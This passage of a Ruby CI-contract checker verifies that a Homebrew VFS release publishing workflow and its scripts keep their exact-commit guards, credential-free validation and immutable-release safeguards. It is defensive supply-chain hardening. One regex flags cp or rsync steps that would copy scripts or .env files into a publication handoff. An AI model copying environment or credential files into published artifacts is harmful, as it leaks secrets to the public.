        !browser_acceptance_source.include?(".saveImage("),
        "browser Homebrew VFS acceptance does not boot the exact fetched image bytes")
  browser_acceptance_test = File.read(
    File.join(REPO_ROOT, "apps/browser-demos/test/homebrew-brewfile-vfs.spec.ts")
  )
  check(browser_acceptance_test.include?("expect(result.imageSha256).toBe(imageSha256)") &&
        browser_acceptance_test.include?("expect(result.kernelSha256).toBe(kernelSha256)") &&
        browser_acceptance_test.include?("expect(result.exitCode, result.stderr).toBe(0)") &&
        browser_acceptance_test.include?("KANDELO_HOMEBREW_ACCEPTANCE_DEFAULT_SHELL_PATH") &&
        browser_acceptance_test.include?("KANDELO_HOMEBREW_ACCEPTANCE_DEFAULT_SHELL_ARGV_JSON") &&
        browser_acceptance_test.include?("pty: true") &&
        browser_acceptance_test.include?("expect(shellResult.imageSha256).toBe(imageSha256)") &&
        browser_acceptance_test.include?("expect(shellResult.kernelSha256).toBe(kernelSha256)") &&
        browser_acceptance_test.include?("expect(shellResult.exitCode, shellResult.stderr).toBe(0)"),
        "browser Homebrew VFS acceptance test does not bind exact artifacts, " \
        "command success, and the focused default-shell PTY proof")
  shell_request_matcher = File.read(
    File.join(REPO_ROOT, "apps/browser-demos/test/homebrew-shell-request.ts")
  )
  product_shell_test = File.read(
    File.join(REPO_ROOT, "apps/browser-demos/test/kandelo-homebrew.spec.ts")
  )
  check(shell_request_matcher.include?("isLegacyShellProgramFetch") &&
        shell_request_matcher.include?('/\\/(?:bash|dash)\\.wasm(?:\\?|$)/') &&
        product_shell_test.include?("isLegacyShellProgramFetch(request.resourceType(), url)") &&
        browser_acceptance_test.include?("isLegacyShellProgramFetch(request.resourceType(), url)") &&
        browser_acceptance_test.include?("expect(legacyShellFetches).toEqual([])"),
        "focused and product default-shell proofs do not share the canonical " \
        "legacy shell request observation")
  publish_workflow_test = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-publish-workflow.sh")
  )
  check(publish_workflow_test.include?(
          'scripts/test-homebrew-main-shell-mirror-workflow.sh'
        ),
        "publisher tests no longer delegate the complete Node and Chromium " \
        "shell proof to the closed-selection mirror contract")
  diagnostics = named_step(verify_steps, "Upload read-only verification diagnostics")
  check(diagnostics.dig("with", "name") ==
          "${{ needs.plan.outputs.artifact-name-prefix }}" \
          "homebrew-verification-diagnostics-${{ matrix.formula }}-" \
          "${{ matrix.arch }}-attempt-${{ github.run_attempt }}" &&
        diagnostics.dig("with", "path").include?(
          "${{ runner.temp }}/homebrew-vfs-acceptance/**"
        ), "publisher diagnostics omit dependency-bearing VFS acceptance evidence")

  source_recheck = named_step(
    verify_steps, "Recheck trusted verifier sources after runtime execution"
  )
  source_recheck_run = source_recheck.fetch("run")
  [
    'git -C kandelo status --short --untracked-files=no',
    'git -C kandelo-sysroot-build rev-parse HEAD',
    'git -C kandelo-sysroot-build status --short --untracked-files=no --ignore-submodules=all',
    'expected_musl_sha="$(git -C kandelo-sysroot-build rev-parse HEAD:libc/musl)"',
    'git -C kandelo-sysroot-build/libc/musl rev-parse HEAD',
  ].each do |fragment|
    check(source_recheck_run.include?(fragment),
          "publisher verifier source recheck lacks #{fragment}")
  end

  vfs_prepare = named_step(verify_steps, "Prepare exact browser-proven VFS release handoff")
  vfs_prepare_run = vfs_prepare.fetch("run")
  vfs_handoff_upload = named_step(
    verify_steps, "Upload exact browser-proven VFS release handoff"
  )
  check(vfs_prepare["if"] == vfs_handoff_condition &&
        vfs_prepare["env"] == {
          "KANDELO_HOMEBREW_ABI" => "${{ needs.plan.outputs.abi }}",
          "KANDELO_HOMEBREW_BOTTLE_RELEASE_TAG" => "${{ needs.plan.outputs.release-tag }}",
          "KANDELO_HOMEBREW_FORMULA" => "${{ matrix.formula }}",
          "KANDELO_HOMEBREW_KANDELO_COMMIT" => "${{ needs.plan.outputs.kandelo-sha }}",
          "KANDELO_HOMEBREW_TAP_COMMIT" => "${{ needs.plan.outputs.tap-sha }}",
          "KANDELO_HOMEBREW_TAP_NAME" => "${{ inputs.tap-name }}",
          "KANDELO_HOMEBREW_TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
        }, "publisher VFS handoff preparation mapping changed")
  [
    "kandelo-postverify/scripts/homebrew-vfs-release.py prepare",
    '--image "$acceptance_root/homebrew-brewfile.vfs.zst"',
    '--report "$acceptance_root/homebrew-brewfile-report.json"',
    '--node-evidence "$acceptance_root/node-evidence.json"',
    '--browser-evidence "$acceptance_root/browser-evidence.json"',
    'runtime_layer="$acceptance_root/kandelo-homebrew-${KANDELO_HOMEBREW_FORMULA}-layer.bin"',
    'runtime_layer_descriptor="$acceptance_root/kandelo-homebrew-${KANDELO_HOMEBREW_FORMULA}-layer.json"',
    '--lazy-layer "$runtime_layer"',
    '--lazy-layer-descriptor "$runtime_layer_descriptor"',
    '--tap-root "$GITHUB_WORKSPACE/tap-postverify"',
    'dependency_tap_args+=(--dependency-tap-root',
    '"$KANDELO_HOMEBREW_RESOLVED_TAPS_FILE"',
    '"${dependency_tap_args[@]}"',
    '--tap-commit "$KANDELO_HOMEBREW_TAP_COMMIT"',
    '--abi "$KANDELO_HOMEBREW_ABI"',
    '--bottle-release-tag "$KANDELO_HOMEBREW_BOTTLE_RELEASE_TAG"',
    '--out "$RUNNER_TEMP/homebrew-vfs-release-handoff"',
  ].each do |fragment|
    check(vfs_prepare_run.include?(fragment), "publisher VFS handoff preparation lacks #{fragment}")
  end
  check(verify_steps.index(source_recheck) < verify_steps.index(vfs_prepare) &&
        verify_steps.index(vfs_prepare) < verify_steps.index(vfs_handoff_upload),
        "publisher packages VFS evidence outside the post-runtime source boundary")

  vfs_snapshot = named_step(vfs_release_steps, "Verify VFS release source snapshots")
  [
    'git -C kandelo rev-parse HEAD', 'git -C kandelo status --short --untracked-files=all',
    'git -C tap-base rev-parse HEAD', 'git -C tap-base status --short --untracked-files=all',
    'git -C dependency-taps/core rev-parse HEAD',
    'git -C dependency-taps/core status --short --untracked-files=all',
  ].each do |fragment|
    check(vfs_snapshot.fetch("run").include?(fragment),
          "publisher VFS release snapshot verification lacks #{fragment}")
  end
  vfs_validate = named_step(vfs_release_steps, "Validate VFS release handoff without credentials")
  check(vfs_validate["id"] == "validate-vfs-release" &&
        vfs_validate["env"] == {
          "CORE_TAP_SHA" => "${{ needs.plan.outputs.core-dependency-tap-sha }}",
          "KANDELO_HOMEBREW_ABI" => "${{ needs.plan.outputs.abi }}",
          "KANDELO_HOMEBREW_BOTTLE_RELEASE_TAG" => "${{ needs.plan.outputs.release-tag }}",
          "KANDELO_HOMEBREW_FORMULA" => "${{ needs.plan.outputs.vfs-acceptance-formula }}",
          "KANDELO_HOMEBREW_KANDELO_COMMIT" => "${{ needs.plan.outputs.kandelo-sha }}",
          "KANDELO_HOMEBREW_TAP_COMMIT" => "${{ needs.plan.outputs.tap-sha }}",
          "KANDELO_HOMEBREW_TAP_NAME" => "${{ inputs.tap-name }}",
          "KANDELO_HOMEBREW_TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
        } &&
        vfs_validate.fetch("run").include?('[ -z "${GH_TOKEN:-}" ]') &&
        vfs_validate.fetch("run").include?('[ -z "${GITHUB_TOKEN:-}" ]') &&
        vfs_validate.fetch("run").include?("homebrew-vfs-release.py validate") &&
        vfs_validate.fetch("run").include?('dependency_tap_args+=(--dependency-tap-root') &&
        vfs_validate.fetch("run").include?(
          '"kandelo-dev/tap-core=$GITHUB_WORKSPACE/dependency-taps/core"'
        ) &&
        vfs_validate.fetch("run").include?('"${dependency_tap_args[@]}"') &&
        vfs_validate.fetch("run").include?('--abi "$KANDELO_HOMEBREW_ABI"') &&
        vfs_validate.fetch("run").include?(
          '--bottle-release-tag "$KANDELO_HOMEBREW_BOTTLE_RELEASE_TAG"'
        ) &&
        !vfs_validate.fetch("env", {}).key?("GH_TOKEN"),
        "publisher VFS handoff is not revalidated without credentials")
  vfs_publish = named_step(
    vfs_release_steps, "Publish and anonymously read back the immutable VFS release"
  )
  check(vfs_release_steps.index(vfs_validate) < vfs_release_steps.index(vfs_publish) &&
        vfs_publish["id"] == "publish-vfs-release" &&
        vfs_publish["env"] == {
          "CORE_TAP_SHA" => "${{ needs.plan.outputs.core-dependency-tap-sha }}",
          "KANDELO_HOMEBREW_ABI" => "${{ needs.plan.outputs.abi }}",
          "KANDELO_HOMEBREW_BOTTLE_RELEASE_TAG" => "${{ needs.plan.outputs.release-tag }}",
          "GH_TOKEN" => "${{ github.token }}",
          "KANDELO_HOMEBREW_FORMULA" => "${{ needs.plan.outputs.vfs-acceptance-formula }}",
          "KANDELO_HOMEBREW_KANDELO_COMMIT" => "${{ needs.plan.outputs.kandelo-sha }}",
          "KANDELO_HOMEBREW_TAP_COMMIT" => "${{ needs.plan.outputs.tap-sha }}",
          "KANDELO_HOMEBREW_TAP_NAME" => "${{ inputs.tap-name }}",
          "KANDELO_HOMEBREW_TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
          "STATE_LOCK_OWNER_DETAIL" => "public VFS release",
        } &&
        vfs_publish.fetch("run").include?("homebrew-publish-vfs-release.sh") &&
        vfs_publish.fetch("run").include?('dependency_tap_args+=(--dependency-tap-root') &&
        vfs_publish.fetch("run").include?(
          '"kandelo-dev/tap-core=$GITHUB_WORKSPACE/dependency-taps/core"'
        ) &&
        vfs_publish.fetch("run").include?('"${dependency_tap_args[@]}"') &&
        vfs_publish.fetch("run").include?('--abi "$KANDELO_HOMEBREW_ABI"') &&
        vfs_publish.fetch("run").include?(
          '--bottle-release-tag "$KANDELO_HOMEBREW_BOTTLE_RELEASE_TAG"'
        ) &&
        vfs_publish.fetch("run").include?('--receipt "$RUNNER_TEMP/homebrew-vfs-release-receipt.json"') &&
        vfs_publish.fetch("run").include?('echo "descriptor-url=$descriptor_url"') &&
        vfs_publish.fetch("run").include?(
          'echo "lazy-layer-descriptor-url=$lazy_layer_descriptor_url"'
        ) &&
        vfs_publish.fetch("run").include?('echo "Browser launch input: \\`?vfs=$image_url\\`"'),
        "publisher VFS write step does not preserve validation, receipt, and launch outputs")

  vfs_validator_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-vfs-release.py"))
  [
    'expected_assets(runtime_id, tree_assets)', 'homebrew-vfs-sha256-', 'validate_bundle_dir',
    'homebrew-runtime-layer-sha256-', 'runtime_layer_bundle_identity_document',
    'runtime_layer_bundle_sha256', 'runtime_layer_descriptor_bytes',
    'canonical-json-v1', 'close_lazy_layer_descriptor',
    'kandelo-homebrew-deferred-layer-draft',
    'exact(actual, expected, "VFS release descriptor")', 'Node evidence image digest',
    'browser image digest', 'selected formula tap commit', 'Node dependency edge',
    'expected Kandelo ABI', 'expected bottle release tag',
    'browser legacy shell downloads', 'query_parameter": "vfs"',
    '"deferred_trees"', 'homebrew-bottle-tar-gzip-v1',
    'validate_lazy_layer_zip', 'validate_lazy_layer_tar_gzip',
    'canonical path order', 'duplicate canonical inode groups',
  ].each do |fragment|
    check(vfs_validator_source.include?(fragment),
          "Homebrew VFS release validator lacks #{fragment}")
  end
  vfs_publisher_source = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-publish-vfs-release.sh")
  )
  [
    'env -u GH_TOKEN -u GITHUB_TOKEN python3',
    '--dependency-tap-root) DEPENDENCY_TAP_ROOTS+=("$2")',
    'validator_args+=(--dependency-tap-root "$dependency_tap_root")',
    'homebrew-vfs-sha256-', 'homebrew-runtime-layer-sha256-',
    'acceptance_tag=', 'runtime_tag=', 'publish_bundle',
    'legacy_acceptance_expected=', 'accepted_existing_asset_sets:',
    'publish-immutable-github-release.sh', '--manifest "$release_manifest"',
    '--asset-root "$HANDOFF"', '--lock-root "$TAP_ROOT"',
    '--exact-kandelo-main-sha "$KANDELO_COMMIT"',
    '--receipt "$receipt"',
    'visibility: "public-anonymous-readback"',
    'acceptance_release:', 'release_tag: $runtime_tag',
    'lazy_layer_asset="kandelo-homebrew-${FORMULA}-layer.bin"',
    'lazy_layer_descriptor_asset="kandelo-homebrew-${FORMULA}-layer.json"',
    '.bundle.assets.deferred_trees[].asset',
    'if $receipt_schema == 3',
    'Provenance and exact Node/Chromium acceptance evidence are attached.',
    'FINAL_RECEIPT_TMP="$(mktemp "$receipt_dir/.homebrew-vfs-release-receipt.XXXXXX")"',
    'mv "$FINAL_RECEIPT_TMP" "$RECEIPT"',
  ].each do |fragment|
    check(vfs_publisher_source.include?(fragment),
          "Homebrew VFS release publisher lacks #{fragment}")
  end

  immutable_publisher_source = File.read(
    File.join(REPO_ROOT, "scripts/publish-immutable-github-release.sh")
  )
  [
    'env -u GH_TOKEN -u GITHUB_TOKEN PYTHONDONTWRITEBYTECODE=1',
    'validate-immutable-github-release-manifest.py', 'state-lock.sh',
    'gh api --paginate --slurp', 'releases?per_page=100',
    'assets?per_page=100',
    'type == "array" and all(.[]; type == "array")',
    '[.[][] | select(.tag_name == $tag)]',
    'github_api_get_json "/repos/${REPOSITORY}/releases/${release_id}"',
    ".id | select(type == \"number\" and . > 0)",
    '.name == $title and .body == $body',
    'existing release identity is malformed or mismatched',
    'public release is not protected by GitHub immutable releases',
    'public release is missing immutable asset', 'Accept: application/octet-stream',
    'retry_command env -u GH_TOKEN -u GITHUB_TOKEN', 'curl --disable',
    'create response was ambiguous; reconciling',
    'upload response for $name was ambiguous; reconciling',
    'tag creation response was ambiguous; reconciling',
    'gh api --method POST "/repos/${REPOSITORY}/git/refs"',
    'ensure_direct_tag',
    'publish response was ambiguous; reconciling',
    '--exact-kandelo-main-sha) EXACT_KANDELO_MAIN_SHA=',
    "--exact-execution-kandelo-main-sha)",
    "--exact-execution-target-main-sha)",
    "--kandelo-main-contains-sha)",
    "--target-main-contains-sha)",
    "exactly one Kandelo main authority is required",
    "target exact-main and main-contains authority are mutually exclusive",
    "exact execution authorities must be supplied together",
    'require_main_authority()',
    'bash "$REPO_ROOT/.github/scripts/require-exact-kandelo-main.sh"',
    '--source-sha "$EXACT_KANDELO_MAIN_SHA"',
    '"$REPO_ROOT/.github/scripts/require-repository-main-contains.sh"',
    '--source-sha "$KANDELO_MAIN_CONTAINS_SHA"',
    '--source-sha "$EXACT_EXECUTION_KANDELO_MAIN_SHA"',
    '--source-sha "$EXACT_EXECUTION_TARGET_MAIN_SHA"',
    'anonymous digest readback failed', '.object.type == "commit"',
    'visibility: "public-anonymous-readback"',
  ].each do |fragment|
    check(immutable_publisher_source.include?(fragment),
          "immutable GitHub release publisher lacks #{fragment}")
  end
  authority_body = immutable_publisher_source
    .split(/^require_main_authority\(\) \{\n/, 2).fetch(1, "")
    .split(/^\}\n/, 2).fetch(0, "")
  contained_authority = authority_body.index(
    'if [ -n "$EXACT_KANDELO_MAIN_SHA" ]'
  )
  execution_authority = authority_body.index(
    'if [ -n "$EXACT_EXECUTION_KANDELO_MAIN_SHA" ]'
  )
  check(
    contained_authority && execution_authority &&
      contained_authority < execution_authority,
    "immutable publisher checks exact execution before content authority"
  )
  [
    /require_main_authority\n\s+if gh api --method POST "\/repos\/\$\{REPOSITORY\}\/releases"/,
    /require_main_authority\n\s+gh release upload "\$TAG"/,
    /require_main_authority\n\s+gh api --method POST "\/repos\/\$\{REPOSITORY\}\/git\/refs"/,
  ].each do |pattern|
    check(immutable_publisher_source.match?(pattern),
          "immutable GitHub release mutation is not immediately preceded by exact-main authority")
  end
  publish_transition_pattern = Regexp.new(
    'require_main_authority\n' \
      '(?:\s+#.*\n)*' \
      '\s+validate_direct_tag\n' \
      '\s+gh api --method PATCH ' \
      '"/repos/\$\{REPOSITORY\}/releases/\$\{release_id\}"'
  )
  check(
    immutable_publisher_source.match?(publish_transition_pattern),
    "immutable GitHub release publish is not immediately preceded by " \
      "exact-main authority and direct-tag validation"
  )
  publisher_entrypoint = immutable_publisher_source.split(
    /^acquire_lock\n/, 2
  ).fetch(1, "")
  early_tag = publisher_entrypoint.index("\nensure_direct_tag\n")
  release_reconciliation = publisher_entrypoint.index("\nrelease_rc=0\n")
  check(
    early_tag && release_reconciliation && early_tag < release_reconciliation,
    "immutable GitHub release publisher does not reserve its exact tag before release reconciliation"
  )
  immutable_manifest_validator_source = File.read(
    File.join(REPO_ROOT, "scripts/validate-immutable-github-release-manifest.py")
  )
  [
    'manifest validation must run without GitHub credentials',
    'safe ASCII basename', 'assets contains duplicate name',
    'copy_verified_asset', 'accepted_existing_asset_sets',
  ].each do |fragment|
    check(immutable_manifest_validator_source.include?(fragment),
          "immutable release manifest validator lacks #{fragment}")
  end
  vfs_test_source = File.read(File.join(REPO_ROOT, "scripts/test-homebrew-vfs-release.sh"))
  [
    "validator accepted a tampered VFS image", "browser evidence for different bytes",
    "browser evidence for another default shell",
    "browser evidence without the reviewed default shell",
    "validator accepted a symlinked handoff entry", "dirty exact tap checkout",
    "idempotent public retry mutated the release", "recover an exact partial draft",
    "replaced an exact partial draft instead of discovering it by authenticated release list",
    "filled a missing asset in an existing public release",
    "overwrote a mismatched public asset", "accepted an unexpected release asset",
    "failed anonymous digest readback", "release tag at the wrong commit",
    "transient anonymous release propagation", "ambiguous successful publish",
    "public release without GitHub immutability",
    "Kandelo ABI outside the trusted plan", "bottle release tag outside the trusted plan",
    "tampered lazy ZIP layer", "lazy ZIP index that differs from its archive",
    "runtime layer that omitted a selected dependency",
    "base receipt change reused a runtime-layer identity",
    "lazy payload change reused a runtime-layer identity",
    "mutated base receipt under the old bundle tag",
    "changed payload bytes under the old bundle tag",
    "unknown runtime bundle field",
    "noncanonical runtime descriptor bytes",
    "changed external transport under the old bundle tag",
    "(.acceptance_assets | length) == 5 and (.assets | length) == 2",
    "complete byte-identical legacy acceptance release",
    "partial legacy acceptance release",
    "failed final receipt construction changed the previous outer receipt",
  ].each do |fragment|
    check(vfs_test_source.include?(fragment), "Homebrew VFS release tests lack #{fragment}")
  end
  immutable_publisher_test_source = File.read(
    File.join(REPO_ROOT, "scripts/test-publish-immutable-github-release.sh")
  )
  [
    "36-asset receipt is incomplete", "partial draft did not upload exactly 26",
    "unsafe asset basename", "duplicate asset declarations",
    "complete accepted subset was not reconciled",
    "failed publication replaced an existing successful receipt",
    "unexpected draft asset", "duplicate release asset names",
    "release asset digest mismatch", "different existing title",
    "duplicate JSON object key", "oversized manifest",
    "pre-existing wrong tag", "wrong pre-existing tag was detected only after publication",
    "failed anonymous readback", "anonymous recovery mutated",
    "FAKE_CREATE_RESPONSE_LOST", "FAKE_UPLOAD_RESPONSE_LOST",
    "FAKE_TAG_RESPONSE_LOST", "FAKE_PUBLISH_RESPONSE_LOST",
    "workflow-containing target release was attempted before its exact tag",
    "publisher tried to recreate an existing exact tag",
    "conflicting tag failure created a release",
    "tag creation failure reached release creation",
    "release-creation retry did not resume from the retained tag",
    "publisher made a release public after Kandelo main advanced",
    "advanced Kandelo main reached the public release PATCH",
    "publisher made a release public after its tag moved during final authority",
    "moved tag reached the public release PATCH",
    "dual publisher accepted a revoked Kandelo execution commit",
    "dual publisher accepted a revoked target execution commit",
    "dual publisher accepted diverged Kandelo content",
    "dual publisher accepted diverged target content",
  ].each do |fragment|
    check(immutable_publisher_test_source.include?(fragment),
          "immutable release publisher tests lack #{fragment}")
  end

  package_handoff = named_step(verify_steps,
                               "Package validated data-only publication handoff")
  package_handoff_run = package_handoff.fetch("run")
  check(package_handoff.dig("env", "KANDELO_HOMEBREW_DRY_RUN") == "${{ inputs.dry-run }}",
        "publisher publication handoff does not bind the trusted dry-run mode")
  [
    'mkdir -p "$publish_handoff/build" "$publish_handoff/composition"',
    'homebrew-build-handoff/manifest.json', 'homebrew-build-handoff/bottle.json',
    'homebrew-build-handoff/dependency-provenance.json',
    'cp "$RUNTIME_BOTTLE" "$publish_handoff/build/bottle.tar.gz"', "receipt.json",
    'homebrew-sidecars/sidecars-input.json',
    '.packages[0].bottles[0].bottle_file = "../build/bottle.tar.gz"',
    'if [ "$KANDELO_HOMEBREW_DRY_RUN" = "true" ]; then',
    'payload_args+=(--allow-dry-run)',
    "--defer-whole-tap-validation",
    "scripts/homebrew-validate-publish-handoff.sh",
  ].each do |fragment|
    check(package_handoff_run.include?(fragment), "publisher publication handoff lacks #{fragment}")
  end
  check_forbidden_root_args(package_handoff_run,
                            "publisher publication handoff validation", trusted_runner_roots)
  check(!package_handoff_run.include?("sidecars/Formula") &&
        !package_handoff_run.include?("sidecars/Kandelo"),
        "publisher publication handoff carries stale precomputed tap state")
  check(!package_handoff_run.match?(/(?:^|\s)(?:cp|rsync)[^\n]*(?:scripts?|\.env)(?:\s|\/|$)/),
        "publisher publication handoff includes executable or environment data")

  payload_validation = named_step(
    finalize_steps, "Validate the exact package-scoped publication handoff set"
  )
  publish_checkout = named_step(finalize_steps,
                                "Checkout tap publication branch after payload validation")
  payload_validation_run = payload_validation.fetch("run")
  check(payload_validation["id"] == "validate-payload" &&
        payload_validation["continue-on-error"] == true &&
        payload_validation_run.include?("scripts/homebrew-publish-handoff-paths.sh") &&
        payload_validation_run.include?('--planned-matrix "$KANDELO_HOMEBREW_PLANNED_MATRIX"') &&
        payload_validation_run.include?('--run-attempt "$KANDELO_HOMEBREW_RUN_ATTEMPT"') &&
        payload_validation_run.include?('--out "$handoff_paths"') &&
        payload_validation_run.include?("scripts/homebrew-validate-publish-handoff.sh") &&
        payload_validation_run.include?("--defer-whole-tap-validation") &&
        payload_validation_run.include?("IFS= read -r -d '' formula") &&
        payload_validation_run.include?("IFS= read -r -d '' arch") &&
        payload_validation_run.include?("IFS= read -r -d '' handoff") &&
        payload_validation_run.include?('done <"$handoff_paths"') &&
        payload_validation_run.include?(') 2>"$error_file"') &&
        payload_validation_run.include?('validation_status=$?') &&
        !payload_validation_run.include?('2> >(') &&
        !payload_validation_run.include?('cmp "$expected" "$actual"') &&
        !payload_validation_run.include?("--allow-dry-run") &&
        finalize_steps.index(payload_validation) < finalize_steps.index(publish_checkout),
        "publisher finalizer does not validate a write-only strict handoff before credentialed checkout")
  check_forbidden_root_args(payload_validation_run,
                            "publisher final payload validation", trusted_runner_roots)
  handoff_topology_helper = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-publish-handoff-paths.sh")
  )
  [
    'keys != ["arch", "formula"]',
    'planned matrix contains a duplicate publication',
    'output path must be outside the artifact download',
    'artifact download contains a symlink or special file',
    'flattened handoff is only valid for one planned publication',
    'flattened handoff contains unexpected entries',
    'nested handoffs differ from the exact planned matrix',
    'nested handoff directory is not in the exact planned matrix',
    'normalized handoff count differs from the planned matrix',
    "printf '%s\\0%s\\0%s\\0'",
  ].each do |fragment|
    check(handoff_topology_helper.include?(fragment),
          "publisher publication handoff topology helper lacks #{fragment}")
  end
  forbidden_root_lines = values_for_key(workflow, "run").flat_map do |run|
    next [] unless run.is_a?(String)
    run.lines.filter_map do |line|
      stripped = line.strip.delete_suffix(" \\")
      stripped if stripped.start_with?("--forbidden-root ")
    end
  end
  check(forbidden_root_lines.length == 35,
        "publisher does not pass the exact trusted forbidden-root set at every archive boundary")
  check(forbidden_root_lines.none? { |line| line.include?("linuxbrew") || line.include?("/opt/") },
        "publisher forbids canonical Homebrew prefix or opt metadata")
  publish_step = named_step(
    finalize_steps, "Atomically compose and publish all sidecars under one tap state lock"
  )
  publish_run = publish_step.fetch("run")
  check(publish_run.include?("scripts/homebrew-publish-sidecars.sh") &&
        publish_run.include?('publish_args+=(--publication "$formula" "$arch" "$handoff")') &&
        publish_run.include?(
          '--exact-kandelo-main-sha "$KANDELO_HOMEBREW_KANDELO_COMMIT"'
        ) &&
        publish_run.include?('[ -f "$handoff_paths" ] && [ ! -L "$handoff_paths" ]') &&
        publish_run.include?('done <"$handoff_paths"') &&
        publish_run.include?(') 2>"$error_file"') &&
        publish_run.include?('publish_status=$?') &&
        !publish_run.include?('2> >(') &&
        !publish_run.include?('homebrew-publish-handoffs/homebrew-publish-handoff-') &&
        !publish_run.include?("--sidecar-root"),
        "publisher finalizer bypasses under-lock coordinated package composition")
  finalizer_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-publish-sidecars.sh"))
  expected_commit_subjects = {
    'commit_and_push "Homebrew: Repair ${FORMULA} ${ARCH} bottle sidecars"' => 1,
    'commit_and_push "Homebrew: Repair ${#PUBLICATION_HANDOFFS[@]} bottle sidecar updates"' => 1,
    'commit_and_push "Homebrew: Publish ${FORMULA} ${ARCH} bottle sidecars"' => 1,
    'commit_and_push "Homebrew: Publish ${#PUBLICATION_HANDOFFS[@]} bottle sidecar updates"' => 1,
    'commit_and_push "Homebrew: Record ${FORMULA} ${ARCH} bottle failure"' => 2,
    'commit_and_push "Homebrew: Roll back ${FORMULA} ${ARCH} bottle metadata"' => 1,
    'commit_and_push "Homebrew: Record ${FORMULA} ${ARCH} bottle rollback"' => 1,
  }
  expected_commit_subjects.each do |subject, count|
    check(finalizer_source.scan(subject).length == count,
          "publisher finalizer changed a purpose-prefixed tap commit subject: #{subject}")
  end
  check(!finalizer_source.include?('commit_and_push "homebrew:'),
        "publisher finalizer still generates a lowercase Homebrew commit prefix")
  [
    '--error-detail-file) ERROR_DETAIL_FILE=',
    '--error-detail-file is only valid for an attempt report',
    '--error-detail-file must be a regular non-symlink file',
    'HOMEBREW_MAX_FAILURE_ERROR_BYTES',
    'HOMEBREW_MAX_FAILURE_ERROR_DETAIL_BYTES',
    'data.decode("utf-8", errors="strict")',
    'IFS= read -r -d \'\' safe_error_detail',
    'error_detail: (if $error_detail == "" then null else $error_detail end)',
  ].each do |fragment|
    check(finalizer_source.include?(fragment),
          "publisher failure report lacks bounded exact finalizer detail: #{fragment}")
  end
  [
    '--exact-kandelo-main-sha) EXACT_KANDELO_MAIN_SHA=',
    '--exact-kandelo-main-sha is required before a tap push',
    'bash "$KANDELO_ROOT/.github/scripts/require-exact-kandelo-main.sh"',
    '--source-sha "$EXACT_KANDELO_MAIN_SHA"',
  ].each do |fragment|
    check(finalizer_source.include?(fragment),
          "publisher tap push lacks final exact-main guard: #{fragment}")
  end
  [
    'SOURCE_TAP_ROOT="$COMPOSE_PARENT/source-tap"',
    'SOURCE_TAP_COMMIT="$(git -C "$TAP_ROOT" rev-parse HEAD)"',
    'git -C "$TAP_ROOT" worktree add --detach "$SOURCE_TAP_ROOT" "$SOURCE_TAP_COMMIT"',
    'assert_clean_tap_snapshot "$SOURCE_TAP_ROOT" "refreshed source tap" "$SOURCE_TAP_COMMIT"',
    '--tap-root "$SOURCE_TAP_ROOT"',
    'git -C "$TAP_ROOT" worktree remove --force "$SOURCE_TAP_ROOT"',
  ].each do |fragment|
    check(finalizer_source.include?(fragment),
          "publisher finalizer lacks clean source-snapshot isolation: #{fragment}")
  end
  check(finalizer_source.scan('--tap-root "$SOURCE_TAP_ROOT"').length == 2,
        "publisher finalizer does not bind both source validators to one clean snapshot")
  [
    'PLANNED_TAP_ROOT="$COMPOSE_PARENT/planned-tap-$planned_index"',
    'git -C "$TAP_ROOT" worktree add --detach "$PLANNED_TAP_ROOT" "$input_tap_commit"',
    'assert_static_tap_tree "$PLANNED_TAP_ROOT" "planned composition tap"',
    '[ "$(git -C "$PLANNED_TAP_ROOT" rev-parse HEAD)" = "$input_tap_commit" ]',
    '--reviewed-tap-root "$PLANNED_TAP_ROOT"',
    '--planned-tap-root "$PLANNED_TAP_ROOT"',
    'git -C "$TAP_ROOT" worktree remove --force "$PLANNED_TAP_ROOT"',
  ].each do |fragment|
    check(finalizer_source.include?(fragment),
          "publisher finalizer lacks planned dependency checkout binding: #{fragment}")
  end
  check(finalizer_source.scan('--planned-tap-root "$PLANNED_TAP_ROOT"').length == 1,
        "publisher finalizer passes an ambiguous planned dependency checkout")
  [
    'for ((publication_index = 0; publication_index < ${#PUBLICATION_HANDOFFS[@]}; publication_index++))',
    'compose_publication_handoff',
    'stage_composed_publications',
    'git -C "$TAP_ROOT" apply --index --binary "$patch_path"',
    'run_validator "$COMPOSE_ROOT"',
    'run_validator "$TAP_ROOT"',
    'duplicate publication: $publication_identity',
  ].each do |fragment|
    check(finalizer_source.include?(fragment),
          "publisher finalizer lacks atomic batch invariant: #{fragment}")
  end
  check(finalizer_source.scan(/^acquire_lock$/).length == 1 &&
        finalizer_source.rindex("\nacquire_lock\n") <
          finalizer_source.rindex('for ((publication_index = 0; publication_index < ${#PUBLICATION_HANDOFFS[@]}; publication_index++))'),
        "publisher does not acquire exactly one tap lock before batch composition")
  check(finalizer_source.scan('--reviewed-tap-root "$PLANNED_TAP_ROOT"').length == 1,
        "publisher finalizer does not bind source closure to one planned checkout")
  planned_checkout_index = finalizer_source.index(
    'git -C "$TAP_ROOT" worktree add --detach "$PLANNED_TAP_ROOT" "$input_tap_commit"'
  )
  source_closure_index = finalizer_source.index(
    'scripts/homebrew-validate-formula-source-closure.sh'
  )
  provenance_rebind_index = finalizer_source.index(
    'scripts/homebrew-dependency-provenance.py" validate'
  )
  check(planned_checkout_index && source_closure_index && provenance_rebind_index &&
         planned_checkout_index < source_closure_index &&
         source_closure_index < provenance_rebind_index,
         "publisher finalizer validates sources or dependencies before binding the planned checkout")
  publisher_test_source = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-publish-workflow.sh")
  )
  [
    'add_publish_dependency_sibling_bottle "$tap_root"',
    'make_publish_planned_resolved_tap_map "$tap_root" "$planned"',
    'KANDELO_HOMEBREW_RESOLVED_TAPS_FILE="$resolved_taps"',
    'assert_resolved_primary_override_is_bounded',
    'safe concurrent tap state',
    'dependency provenance accepted an untracked primary tap override',
    'dependency provenance accepted a dirty primary tap override',
    'dependency provenance accepted an unrelated primary tap override',
    'FAKE_PROVENANCE_TAP_ROOT="$provenance_tap"',
    '$(cd "$dependency_tap_root" && pwd -P)',
    '$(cd "$FAKE_PROVENANCE_TAP_ROOT" && pwd -P)',
    'under-lock publisher rejected concurrent sibling bottle metadata',
    'under-lock publisher accepted concurrent dependency Formula whitespace drift',
